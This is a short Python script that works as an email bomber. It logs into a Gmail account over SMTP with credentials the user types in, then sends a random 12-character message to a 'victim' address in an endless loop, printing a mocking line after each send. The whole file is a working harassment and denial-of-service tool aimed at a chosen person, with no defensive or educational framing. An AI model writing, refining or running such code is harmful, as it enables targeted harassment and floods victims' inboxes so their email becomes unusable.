#imports of libaries
import smtplib
import random
import string

#setup
print("Tool was made by hvitserk#6505")
sender=input("the e-mail you want to use: ")
password=input("your app generated password: ")
victim=input("victims e-mail: ")

#creates a random message of 12 length we use as the message to bomb email
length=12
a=string.ascii_letters
b=string.digits
c=string.punctuation
acsii=a+b+c
li=[]
for i in range(length):
    random1=random.choice(acsii)
    li.append(random1)
message="".join(li)

#Functions that bomb the victims email
def google():
    x=True
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(sender, password)
        while x:
            server.sendmail(sender,victim,message)
            print("VICTIM IS GETTING BOMBED, lol")
    except Exception as error:  #if there are any erros, they will be printed out as error
        print(error)

google()